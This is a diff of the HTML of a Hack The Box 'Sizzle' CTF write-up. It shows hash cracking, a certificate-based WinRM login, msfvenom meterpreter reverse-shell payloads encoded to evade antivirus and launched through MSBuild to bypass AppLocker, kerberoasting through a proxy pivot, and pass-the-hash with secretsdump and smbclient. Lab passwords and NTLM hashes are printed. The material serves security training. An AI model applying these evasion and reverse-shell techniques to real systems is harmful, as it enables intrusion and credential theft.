-<p><img src="/images/hackthebox/sizzle/14.png" alt="" /></p>
-<h4 id="the-password-is-ashare1972">The password is <code class="highlighter-rouge">Ashare1972</code></h4>
-<p><br /></p>
+<img src="/images/hackthebox/sizzle/13.png" alt="" />
+<br /> <code class="highlighter-rouge">responder</code> caught hash for a user called <code class="highlighter-rouge">amanda</code>. Let’s crack it with <code class="highlighter-rouge">john</code> :
+<img src="/images/hackthebox/sizzle/14.png" alt="" />
+<br /> The password is <code class="highlighter-rouge">Ashare1972</code>
+<br /></p>
 <hr />
 
-<h3 id="requesting-a-certificate-winrm-session-as-amanda">Requesting a Certificate, WinRm Session as amanda</h3>
-<h4 id="i-tried-to-access-certenroll-as-amanda-and-it-worked-fine-">I tried to access <code class="highlighter-rouge">certenroll</code> as <code class="highlighter-rouge">amanda</code> and it worked fine :</h4>
-<p><img src="/images/hackthebox/sizzle/15.png" alt="" /></p>
-<h4 id="so-i-went-to-certsrv--and-used-amandas-credentials-to-authenticate">So I went to <code class="highlighter-rouge">/certsrv</code>  and used <code class="highlighter-rouge">amanda</code>’s credentials to authenticate</h4>
-<p><img src="/images/hackthebox/sizzle/16.png" alt="" />
+<h2 id="requesting-a-certificate-winrm-session-as-amanda">Requesting a Certificate, WinRm Session as amanda</h2>
+<p><br /> I tried to access <code class="highlighter-rouge">certenroll</code> as <code class="highlighter-rouge">amanda</code> and it worked fine :
+<img src="/images/hackthebox/sizzle/15.png" alt="" />
+<br /> So I went to <code class="highlighter-rouge">/certsrv</code>  and used <code class="highlighter-rouge">amanda</code>’s credentials to authenticate
+<img src="/images/hackthebox/sizzle/16.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/sizzle/17.png" alt="" /></p>
-<h4 id="now-its-time-to-get-a-certificate-but-wait-a-second-whats-the-certificate-for-anyway-">Now it’s time to get a certificate. But wait a second, what’s the certificate for anyway ?</h4>
-<h4 id="a-full-nmap-scan-shows-that-winrm-ports-are-open-">A full <code class="highlighter-rouge">nmap</code> scan shows that <code class="highlighter-rouge">WinRm</code> ports are open :</h4>
-<p><code class="highlighter-rouge">nmap -p- -T5 -vvv --max-retries 1 sizzle.htb</code>
-<img src="/images/hackthebox/sizzle/18.png" alt="" /></p>
-<h4 id="full-output--1">Full Output :</h4>
+<img src="/images/hackthebox/sizzle/17.png" alt="" />
+<br /> Now it’s time to get a certificate. But wait a second, what’s the certificate for anyway ?
+<br /> A full <code class="highlighter-rouge">nmap</code> scan shows that <code class="highlighter-rouge">WinRm</code> ports are open :
+<code class="highlighter-rouge">nmap -p- -T5 -vvv --max-retries 1 sizzle.htb</code>
+<img src="/images/hackthebox/sizzle/18.png" alt="" />
+<br /> Full Output :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.70 scan initiated Fri May 31 20:22:10 2019 as: nmap -p- -T5 -vvv -o nmapfull --max-retries 1 sizzle.htb
 Warning: 10.10.10.103 giving up on port because retransmission cap hit (1).
 Nmap scan report for sizzle.htb (10.10.10.103)
@@ -286,8 +289,8 @@ Read data files from: /usr/bin/../share/nmap
 # Nmap done at Fri May 31 20:25:50 2019 -- 1 IP address (1 host up) scanned in 220.02 seconds
 </code></pre></div></div>
 <p><code class="highlighter-rouge">nmap -p 5985,5986 -sV -sT -sC sizzle.htb</code>
-<img src="/images/hackthebox/sizzle/19.png" alt="" /></p>
-<h4 id="full-output--2">Full Output :</h4>
+<img src="/images/hackthebox/sizzle/19.png" alt="" />
+<br /> Full Output :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.70 scan initiated Fri May 31 20:27:46 2019 as: nmap -p 5985,5986 -sV -sT -sC -o nmapwinrm sizzle.htb
 Nmap scan report for sizzle.htb (10.10.10.103)
 Host is up (0.11s latency).
@@ -315,27 +318,27 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Fri May 31 20:28:43 2019 -- 1 IP address (1 host up) scanned in 57.38 seconds
 </code></pre></div></div>
-<h4 id="port-5985-uses-http-while-5986-uses-https-when-i-got-amandas-credentials-i-tried-to-connect-to-port-5985-and-i-couldnt-so-we-will-do-it-through-port-5986-thats-why-we-need-a-certificate-if-you-dont-know-how-to-connect-through-winrm-well-get-to-that-later">Port 5985 uses <code class="highlighter-rouge">http</code> while <code class="highlighter-rouge">5986</code> uses <code class="highlighter-rouge">https</code>. When I got <code class="highlighter-rouge">amanda</code>’s credentials I tried to connect to port 5985 and I couldn’t, So we will do it through port 5986 that’s why we need a certificate. (If you don’t know how to connect through <code class="highlighter-rouge">WinRm</code>, we’ll get to that later.)</h4>
-<h4 id="we-will-generate-a-certificate-request-and-a-private-key-">We will generate a certificate request and a private key :</h4>
-<p><code class="highlighter-rouge">openssl req -newkey rsa:2048 -nodes -keyout request.key -out request.csr</code>
-<img src="/images/hackthebox/sizzle/20.png" alt="" /></p>
-<h4 id="then-we-will-submit-an-advanced-certificate-request-paste-our-request-and-download-the-certificate-base64-encoded">Then we will submit an advanced certificate request, paste our request and download the certificate (base64 encoded)</h4>
-<p><img src="/images/hackthebox/sizzle/21.png" alt="" />
+<p><br /> Port 5985 uses <code class="highlighter-rouge">http</code> while <code class="highlighter-rouge">5986</code> uses <code class="highlighter-rouge">https</code>. When I got <code class="highlighter-rouge">amanda</code>’s credentials I tried to connect to port 5985 and I couldn’t, So we will do it through port 5986 that’s why we need a certificate. (If you don’t know how to connect through <code class="highlighter-rouge">WinRm</code>, we’ll get to that later.)
+<br /> We will generate a certificate request and a private key :
+<code class="highlighter-rouge">openssl req -newkey rsa:2048 -nodes -keyout request.key -out request.csr</code>
+<img src="/images/hackthebox/sizzle/20.png" alt="" />
+<br /> Then we will submit an advanced certificate request, paste our request and download the certificate (base64 encoded)
+<img src="/images/hackthebox/sizzle/21.png" alt="" />
 <br />
 <br />
 <img src="/images/hackthebox/sizzle/22.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/sizzle/23.png" alt="" /></p>
-<h4 id="now-we-can-use-winrm-but-whats-winrm-">Now we can use <code class="highlighter-rouge">WinRm</code>, but what’s <code class="highlighter-rouge">WinRm</code> ?</h4>
+<img src="/images/hackthebox/sizzle/23.png" alt="" />
+<br /> Now we can use <code class="highlighter-rouge">WinRm</code>, but what’s <code class="highlighter-rouge">WinRm</code> ?</p>
 <blockquote>
   <p>Windows Remote Management (WinRM) is the Microsoft implementation of <a href="https://docs.microsoft.com/en-us/windows/desktop/winrm/ws-management-protocol">WS-Management Protocol</a>, a standard Simple Object Access Protocol (SOAP)-based, firewall-friendly protocol that allows hardware and operating systems, from different vendors, to interoperate.
 The WS-Management protocol specification provides a common way for systems to access and exchange management information across an IT infrastructure. WinRM and <a href="https://docs.microsoft.com/en-us/windows/desktop/winrm/windows-remote-management-glossary"><em>Intelligent Platform Management Interface (IPMI)</em></a>, along with the <a href="https://go.microsoft.com/fwlink/p/?linkid=84396">Event Collector</a> are components of the <a href="https://go.microsoft.com/fwlink/p/?linkid=45204">Windows Hardware Management</a> features. -<a href="https://docs.microsoft.com/en-us/windows/desktop/winrm/portal">Microsoft</a></p>
 </blockquote>
 
-<h4 id="winrm-is-not-meant-to-be-used-from-linux-but-luckily-theres-a-ruby-library-for-it-thats-how-we-will-connect"><code class="highlighter-rouge">WinRm</code> is not meant to be used from Linux but luckily there’s a <a href="https://github.com/WinRb/WinRM">Ruby library</a> for it. That’s how we will connect.</h4>
-<h4 id="i-used-alamots-shell-and-added-some-stuff-for-the-cert-and-the-key-">I used <a href="https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb">Alamot’s shell</a> and added some stuff for the cert and the key :</h4>
-<p><img src="/images/hackthebox/sizzle/24.png" alt="" /></p>
+<p><br /> <code class="highlighter-rouge">WinRm</code> is not meant to be used from Linux but luckily there’s a <a href="https://github.com/WinRb/WinRM">Ruby library</a> for it. That’s how we will connect. 
+<br /> I used <a href="https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb">Alamot’s shell</a> and added some stuff for the cert and the key :
+<img src="/images/hackthebox/sizzle/24.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/ruby</span>
 <span class="nb">require</span> <span class="s1">'winrm'</span>
 
@@ -364,15 +367,15 @@ The WS-Management protocol specification provides a common way for systems to ac
     <span class="nb">puts</span> <span class="s2">"Exiting with code </span><span class="si">#{</span><span class="n">output</span><span class="p">.</span><span class="nf">exitcode</span><span class="si">}</span><span class="s2">"</span>
 <span class="k">end</span>
 </code></pre></div></div>
-<h4 id="and-it-worked-">And it worked :</h4>
-<p><img src="/images/hackthebox/sizzle/25.png" alt="" /></p>
-<h4 id="but-there-was-no-usertxt-">But there was no <code class="highlighter-rouge">user.txt</code> :</h4>
-<p><img src="/images/hackthebox/sizzle/26.png" alt="" /></p>
+<p><br /> And it worked :
+<img src="/images/hackthebox/sizzle/25.png" alt="" />
+<br /> But there was no <code class="highlighter-rouge">user.txt</code> :
+<img src="/images/hackthebox/sizzle/26.png" alt="" /></p>
 <hr />
 
-<h3 id="stored-ntlm-hashes-secretsdump-privilege-escalation">Stored NTLM Hashes, Secretsdump, Privilege Escalation</h3>
-<h4 id="through-the-filesystem-enumeration-i-found-a-file-called-filetxt-in-cwindowssystem32-that-file-had-ntlm-hashes-for-all-users-">Through the filesystem enumeration I found a file called <code class="highlighter-rouge">file.txt</code> in <code class="highlighter-rouge">C:\Windows\System32</code>. That file had NTLM hashes for all users !</h4>
-<p><img src="/images/hackthebox/sizzle/27.png" alt="" /></p>
+<h2 id="stored-ntlm-hashes-secretsdump-privilege-escalation">Stored NTLM Hashes, Secretsdump, Privilege Escalation</h2>
+<p><br /> Through the filesystem enumeration I found a file called <code class="highlighter-rouge">file.txt</code> in <code class="highlighter-rouge">C:\Windows\System32</code>. That file had NTLM hashes for all users ! 
+<img src="/images/hackthebox/sizzle/27.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:c718f548c75062ada93250db208d3178:::
 
@@ -383,45 +386,45 @@ amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
 mrb3n:1105:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
 mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
 </code></pre></div></div>
-<h4 id="honestly-i-dont-know-how-did-that-get-there-after-resetting-the-machine-the-file-was-still-there-i-dont-know-if-the-creator-made-an-unintended-mistake-but-anyway-lets-see-how-can-we-use-that">Honestly I don’t know how did that get there, After resetting the machine the file was still there. I don’t know if the creator made an unintended mistake but anyway let’s see how can we use that.</h4>
-<h4 id="that-administrator-hash-was-useless-i-tried-it-with-smb-i-cracked-it-tried-psexec-it-didnt-work-i-cracked-mrlkys-hash-">That Administrator hash was useless, I tried it with <code class="highlighter-rouge">smb</code>, I cracked it, tried <code class="highlighter-rouge">psexec</code>. It didn’t work. I cracked <code class="highlighter-rouge">mrlky</code>’s hash :</h4>
-<p><img src="/images/hackthebox/sizzle/28.png" alt="" /></p>
-<h4 id="the-password-was-football7-i-used-it-with-secretsdumppy-from-impacket-and-got-another-administrators-hash-">The password was <code class="highlighter-rouge">Football#7</code>, I used it with <code class="highlighter-rouge">secretsdump.py</code> from <code class="highlighter-rouge">impacket</code> and got another Administrator’s hash :</h4>
-<p><img src="/images/hackthebox/sizzle/29.png" alt="" /></p>
-<h4 id="it-was-uncrackable-i-tried-psexec-metasploit-module-and-for-some-reason-it-didnt-work-so-i-used-the-hash-with-smb-to-access-c-then-i-downloaded-the-flags">It was uncrackable, I tried <code class="highlighter-rouge">psexec</code> <code class="highlighter-rouge">metasploit</code> module and for some reason it didn’t work so I used the hash with <code class="highlighter-rouge">smb</code> to access <code class="highlighter-rouge">C$</code> then I downloaded the flags.</h4>
-<p><code class="highlighter-rouge">smbclient //sizzle.htb/C$ -U "Administrator" --pw-nt-hash f6b7160bfc91823792e0ac3a162c9267</code>
+<p><br /> Honestly I don’t know how did that get there, After resetting the machine the file was still there. I don’t know if the creator made an unintended mistake but anyway let’s see how can we use that. 
+<br /> That Administrator hash was useless, I tried it with <code class="highlighter-rouge">smb</code>, I cracked it, tried <code class="highlighter-rouge">psexec</code>. It didn’t work. I cracked <code class="highlighter-rouge">mrlky</code>’s hash :
+<img src="/images/hackthebox/sizzle/28.png" alt="" />
+<br /> The password was <code class="highlighter-rouge">Football#7</code>, I used it with <code class="highlighter-rouge">secretsdump.py</code> from <code class="highlighter-rouge">impacket</code> and got another Administrator’s hash :
+<img src="/images/hackthebox/sizzle/29.png" alt="" />
+<br /> It was uncrackable, I tried <code class="highlighter-rouge">psexec</code> <code class="highlighter-rouge">metasploit</code> module and for some reason it didn’t work so I used the hash with <code class="highlighter-rouge">smb</code> to access <code class="highlighter-rouge">C$</code> then I downloaded the flags.
+<code class="highlighter-rouge">smbclient //sizzle.htb/C$ -U "Administrator" --pw-nt-hash f6b7160bfc91823792e0ac3a162c9267</code>
 <img src="/images/hackthebox/sizzle/30.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/sizzle/31.png" alt="" /></p>
-<h4 id="now-forget-that-we-saw-that-lets-try-something-more-realistic">Now forget that we saw that, Let’s try something more realistic.</h4>
-<p><br /></p>
+<img src="/images/hackthebox/sizzle/31.png" alt="" />
+<br /> Now forget that we saw that, Let’s try something more realistic.
+<br /></p>
 <hr />
 
-<h3 id="backtrack">Backtrack</h3>
-<h4 id="back-to-the-winrm-session-as-amanda-lets-examine-our-environment">Back to the <code class="highlighter-rouge">WinRm</code> session as <code class="highlighter-rouge">amanda</code>, let’s examine our environment.</h4>
-<h4 id="there-was-applocker-">There was AppLocker :</h4>
-<p><img src="/images/hackthebox/sizzle/32.png" alt="" /></p>
-<h4 id="antivirus-">Antivirus :</h4>
-<p><img src="/images/hackthebox/sizzle/33.png" alt="" /></p>
-<h4 id="we-were-even-in-constrained-language-mode-in-powershell-">We were even in Constrained Language Mode in PowerShell :</h4>
-<p><img src="/images/hackthebox/sizzle/34.png" alt="" /></p>
-<h4 id="since-this-was-an-active-directory-environment-i-wanted-to-do-kerberoasting-but-invoke-kerberoastps1-needed-full-language-mode-i-couldnt-use-getuserspnspy-because-the-services-were-internal-only-and-my-attempts-to-evade-the-antivirus-failed-i-could-bypass-the-constrained-language-mode-with-psbypassclm-and-still-couldnt-use-invoke-kerberoastps1-applocker-is-easy-to-bypass-so-it-wasnt-an-issue-but-i-had-to-bypass-the-antivirus">Since this was an Active Directory environment I wanted to do kerberoasting, but <code class="highlighter-rouge">Invoke-Kerberoast.ps1</code> needed Full Language Mode, I couldn’t use <code class="highlighter-rouge">GetUserSPNs.py</code> because the services were internal only. And my attempts to evade the antivirus failed. I could bypass the constrained language mode with <a href="https://github.com/padovah4ck/PSByPassCLM">PSByPassCLM</a> and still couldn’t use <code class="highlighter-rouge">Invoke-Kerberoast.ps1</code>. AppLocker is easy to <a href="https://github.com/api0cradle/UltimateAppLockerByPassList">bypass</a> so it wasn’t an issue. But I had to bypass the antivirus.</h4>
-<p><br /></p>
+<h2 id="backtrack">Backtrack</h2>
+<p><br /> Back to the <code class="highlighter-rouge">WinRm</code> session as <code class="highlighter-rouge">amanda</code>, let’s examine our environment.
+<br /> There was AppLocker :
+<img src="/images/hackthebox/sizzle/32.png" alt="" />
+<br /> Antivirus :
+<img src="/images/hackthebox/sizzle/33.png" alt="" />
+<br /> We were even in Constrained Language Mode in PowerShell :
+<img src="/images/hackthebox/sizzle/34.png" alt="" />
+<br /> Since this was an Active Directory environment I wanted to do kerberoasting, but <code class="highlighter-rouge">Invoke-Kerberoast.ps1</code> needed Full Language Mode, I couldn’t use <code class="highlighter-rouge">GetUserSPNs.py</code> because the services were internal only. And my attempts to evade the antivirus failed. I could bypass the constrained language mode with <a href="https://github.com/padovah4ck/PSByPassCLM">PSByPassCLM</a> and still couldn’t use <code class="highlighter-rouge">Invoke-Kerberoast.ps1</code>. AppLocker is easy to <a href="https://github.com/api0cradle/UltimateAppLockerByPassList">bypass</a> so it wasn’t an issue. But I had to bypass the antivirus. 
+<br /></p>
 <hr />
 
-<h3 id="bypassing-av">Bypassing AV</h3>
-<h4 id="i-found-this-article-and-this-poc">I found <a href="https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-msbuild-exe/">this article</a> and this <a href="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml">POC</a></h4>
-<h4 id="first-time-i-created-the-payload-like-this-">First time I created the payload like this :</h4>
-<p><code class="highlighter-rouge">msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.xx.xx LPORT=1339 -f csharp</code></p>
-<h4 id="and-i-added-the-shellcode-to-the-poc-and-applied-the-exploit-">And I added the shellcode to the POC and applied the exploit :</h4>
-<p><code class="highlighter-rouge">C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\windows\system32\spool\drivers\color\shellcode.xml</code>
-<img src="/images/hackthebox/sizzle/35.png" alt="" /></p>
-<h4 id="the-antivirus-detected-it-i-added-an-encoder-and-100-iterations-and-tried-again-">The antivirus detected it. I added an encoder and 100 iterations and tried again :</h4>
-<p><code class="highlighter-rouge">msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.xx.xx LPORT=1339 -e x86/shikata_ga_nai -i 100 -f csharp</code>
-<img src="/images/hackthebox/sizzle/36.png" alt="" /></p>
-<h4 id="then-i-added-the-shellcode-to-shellcodexml">Then I added the shellcode to <code class="highlighter-rouge">shellcode.xml</code></h4>
-<h4 id="shellcodexml-"><code class="highlighter-rouge">shellcode.xml</code> :</h4>
+<h2 id="bypassing-av">Bypassing AV</h2>
+<p><br /> I found <a href="https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-msbuild-exe/">this article</a> and this <a href="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml">POC</a>
+<br /> First time I created the payload like this :
+<code class="highlighter-rouge">msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.xx.xx LPORT=1339 -f csharp</code>
+<br /> And I added the shellcode to the POC and applied the exploit :
+<code class="highlighter-rouge">C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\windows\system32\spool\drivers\color\shellcode.xml</code>
+<img src="/images/hackthebox/sizzle/35.png" alt="" />
+<br /> The antivirus detected it. I added an encoder and 100 iterations and tried again :
+<code class="highlighter-rouge">msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.xx.xx LPORT=1339 -e x86/shikata_ga_nai -i 100 -f csharp</code>
+<img src="/images/hackthebox/sizzle/36.png" alt="" />
+<br /> Then I added the shellcode to <code class="highlighter-rouge">shellcode.xml</code>
+<br /> <code class="highlighter-rouge">shellcode.xml</code> :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"&gt;
   &lt;!-- This inline task executes shellcode. --&gt;
   &lt;!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj --&gt;
@@ -701,26 +704,26 @@ mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
 &lt;/Project&gt;
 </code></pre></div></div>
 <p><code class="highlighter-rouge">C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\windows\system32\spool\drivers\color\shellcode.xml</code>
-<img src="/images/hackthebox/sizzle/37.png" alt="" /></p>
-<h4 id="this-time-it-worked-and-i-got-meterpreter-">This time it worked and I got <code class="highlighter-rouge">meterpreter</code> !</h4>
-<p><img src="/images/hackthebox/sizzle/38.png" alt="" /></p>
+<img src="/images/hackthebox/sizzle/37.png" alt="" />
+<br /> This time it worked and I got <code class="highlighter-rouge">meterpreter</code> !
+<img src="/images/hackthebox/sizzle/38.png" alt="" /></p>
 <hr />
 
-<h3 id="kerberoasting-privilege-escalation">Kerberoasting, Privilege Escalation</h3>
-<h4 id="now-we-have-a-meterpreter-session-we-can-route-the-internal-subnet-use-a-proxy-then-use-getuserspnspy-and-see-if-any-user-is-kerberoastable-this-technique-is-covered-here">Now we have a <code class="highlighter-rouge">meterpreter</code> session, we can route the internal subnet, use a proxy then use <code class="highlighter-rouge">GetUserSPNs.py</code> and see if any user is kerberoastable. This technique is covered <a href="https://www.blackhillsinfosec.com/a-toast-to-kerberoast/">here</a></h4>
-<h4 id="first-thing-is-to-configure-proxychains-to-use-port-8080-">First thing is to configure <code class="highlighter-rouge">proxychains</code> to use port 8080 :</h4>
-<p><code class="highlighter-rouge">/etc/proxychains.conf</code>
-<img src="/images/hackthebox/sizzle/39.png" alt="" /></p>
-<h4 id="then-we-will-use-auxiliaryserversocks4a-to-add-the-route-and-set-up-the-proxy-">Then we will use <code class="highlighter-rouge">auxiliary/server/socks4a</code> to add the route and set up the proxy :</h4>
-<p><img src="/images/hackthebox/sizzle/40.png" alt="" /></p>
-<h4 id="route-add-1010100-2552552550-1-this-adds-a-route-of-the-whole-internal-subnet-where-1-is-the-session-number"><code class="highlighter-rouge">route add 10.10.10.0 255.255.255.0 1</code> this adds a route of the whole internal subnet where <code class="highlighter-rouge">1</code> is the session number.</h4>
-<h4 id="now-we-are-ready-lets-kerberoast-">Now we are ready. Let’s kerberoast !</h4>
-<p><code class="highlighter-rouge">proxychains GetUserSPNs.py -request -dc-ip 10.10.10.103 HTB.LOCAL/amanda:Ashare1972</code>
-<img src="/images/hackthebox/sizzle/41.png" alt="" /></p>
-<h4 id="user-mrlky-was-kerberoastable-and-we-got-a-hash-lets-pass-it-to-john-">User <code class="highlighter-rouge">mrlky</code> was kerberoastable and we got a hash, let’s pass it to <code class="highlighter-rouge">john</code> :</h4>
-<p><img src="/images/hackthebox/sizzle/42.png" alt="" /></p>
-<h4 id="password-is-football7-now-we-can-use-secretdumppy-again-and-do-the-same-thing-we-did-before-">Password is <code class="highlighter-rouge">Football#7</code>, now we can use <code class="highlighter-rouge">secretdump.py</code> again and do the same thing we did before :</h4>
-<p><img src="/images/hackthebox/sizzle/43.png" alt="" />
+<h2 id="kerberoasting-privilege-escalation">Kerberoasting, Privilege Escalation</h2>
+<p><br /> Now we have a <code class="highlighter-rouge">meterpreter</code> session, we can route the internal subnet, use a proxy then use <code class="highlighter-rouge">GetUserSPNs.py</code> and see if any user is kerberoastable. This technique is covered <a href="https://www.blackhillsinfosec.com/a-toast-to-kerberoast/">here</a>
+<br /> First thing is to configure <code class="highlighter-rouge">proxychains</code> to use port 8080 :
+<code class="highlighter-rouge">/etc/proxychains.conf</code>
+<img src="/images/hackthebox/sizzle/39.png" alt="" />
+<br /> Then we will use <code class="highlighter-rouge">auxiliary/server/socks4a</code> to add the route and set up the proxy :
+<img src="/images/hackthebox/sizzle/40.png" alt="" />
+<br /> <code class="highlighter-rouge">route add 10.10.10.0 255.255.255.0 1</code> this adds a route of the whole internal subnet where <code class="highlighter-rouge">1</code> is the session number.
+<br /> Now we are ready. Let’s kerberoast !
+<code class="highlighter-rouge">proxychains GetUserSPNs.py -request -dc-ip 10.10.10.103 HTB.LOCAL/amanda:Ashare1972</code>
+<img src="/images/hackthebox/sizzle/41.png" alt="" />
+<br /> User <code class="highlighter-rouge">mrlky</code> was kerberoastable and we got a hash, let’s pass it to <code class="highlighter-rouge">john</code> :
+<img src="/images/hackthebox/sizzle/42.png" alt="" />
+<br /> Password is <code class="highlighter-rouge">Football#7</code>, now we can use <code class="highlighter-rouge">secretdump.py</code> again and do the same thing we did before :
+<img src="/images/hackthebox/sizzle/43.png" alt="" />
 <br />
 <br />
 <img src="/images/hackthebox/sizzle/44.png" alt="" />
@@ -729,48 +732,145 @@ mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
 <img src="/images/hackthebox/sizzle/45.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/sizzle/46.png" alt="" /></p>
-<h4 id="and-we-owned-root-">And we owned root !</h4>
-<h4 id="thats-it--feedback-is-appreciated-">That’s it , Feedback is appreciated !</h4>
-<h4 id="dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-ahm3d_h3sham">Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a></h4>
-<h4 id="thanks-for-reading">Thanks for reading.</h4>
-<p><br />
-<br /></p>
-<h4 id="previous-hack-the-box-write-up--hack-the-box---chaos">Previous Hack The Box write-up : <a href="/hack-the-box/chaos/">Hack The Box - Chaos</a></h4>
-<h4 id="next-hack-the-box-write-up--hack-the-box---help">Next Hack The Box write-up : <a href="/hack-the-box/help/">Hack The Box - Help</a></h4>
+<img src="/images/hackthebox/sizzle/46.png" alt="" />
+<br /> And we owned root !
+<br /> That’s it , Feedback is appreciated !
+<br /> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a>
+<br /> Thanks for reading.
+<br />
+<br />
+<br /> Previous Hack The Box write-up : <a href="/hack-the-box/chaos/">Hack The Box - Chaos</a>
+<br /> Next Hack The Box write-up : <a href="/hack-the-box/help/">Hack The Box - Help</a></p>
 <hr />
 
 
-  </div>
-<script src="https://www.hackthebox.eu/badge/65598"></script><a class="u-url" href="/hack-the-box/sizzle/" hidden></a>
-</article>
-
-      </div>
-    </main><footer class="site-footer h-card">
-  <data class="u-url" href="/"></data>
-
-  <div class="wrapper">
-
-    <h2 class="footer-heading">0xRick Owned Root !</h2>
-
-    <div class="footer-col-wrapper">
-      <div class="footer-col footer-col-1">
-        <ul class="contact-list">
-          <li class="p-name">0xRick Owned Root !</li></ul>
-      </div>
-
-      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://www.facebook.com/Ahm3d.H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#facebook"></use></svg> <span class="username">Ahm3d.H3sham</span></a></li><li><a href="https://github.com/0xRick"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">0xRick</span></a></li><li><a href="https://www.twitter.com/Ahm3d_H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">Ahm3d_H3sham</span></a></li></ul>
 </div>
 
-      <div class="footer-col footer-col-3">
-        <p>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</p>
+
+
+
+
+<div class="related">
+  <h2>other posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/pwn/collision/">
+            pwnable.kr - collision
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box/unattended/">
+            Hack The Box - Unattended
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box/helpline/">
+            Hack The Box - Helpline
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/active-directory/" class="set-1">active-directory</a> <a href="/tag/binary-exploitation/" class="set-3">binary-exploitation</a> <a href="/tag/bsd/" class="set-1">bsd</a> <a href="/tag/buffer-overflow/" class="set-2">buffer-overflow</a> <a href="/tag/c/" class="set-2">c</a> <a href="/tag/code-analysis/" class="set-1">code-analysis</a> <a href="/tag/cryptography/" class="set-1">cryptography</a> <a href="/tag/drupal/" class="set-1">drupal</a> <a href="/tag/egghunting/" class="set-1">egghunting</a> <a href="/tag/exploit-development/" class="set-1">exploit development</a> <a href="/tag/exploit-development/" class="set-2">exploit-development</a> <a href="/tag/firewall/" class="set-1">firewall</a> <a href="/tag/forensics/" class="set-1">forensics</a> <a href="/tag/ftp/" class="set-1">ftp</a> <a href="/tag/joomla/" class="set-1">joomla</a> <a href="/tag/latex-injection/" class="set-1">latex-injection</a> <a href="/tag/ldap/" class="set-1">ldap</a> <a href="/tag/lfi/" class="set-1">lfi</a> <a href="/tag/linux/" class="set-5">linux</a> <a href="/tag/networking/" class="set-2">networking</a> <a href="/tag/php/" class="set-2">php</a> <a href="/tag/pivoting/" class="set-1">pivoting</a> <a href="/tag/python/" class="set-3">python</a> <a href="/tag/rbash/" class="set-1">rbash</a> <a href="/tag/rce/" class="set-5">rce</a> <a href="/tag/reverse-engineering/" class="set-1">reverse-engineering</a> <a href="/tag/smb/" class="set-2">smb</a> <a href="/tag/snmp/" class="set-1">snmp</a> <a href="/tag/sqli/" class="set-1">sqli</a> <a href="/tag/ssh/" class="set-3">ssh</a> <a href="/tag/ssti/" class="set-1">ssti</a> <a href="/tag/steganography/" class="set-1">steganography</a> <a href="/tag/web/" class="set-5">web</a> <a href="/tag/windows/" class="set-3">windows</a> <a href="/tag/windows-exploitation/" class="set-1">windows-exploitation</a> <a href="/tag/wordpress/" class="set-1">wordpress</a></div>
+  
+
+
+
       </div>
-    </div>
+    </main><footer class="site-footer">
+	<center> <script src="https://www.hackthebox.eu/badge/65598"></script> </center>
+  <div class="wrapper"><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
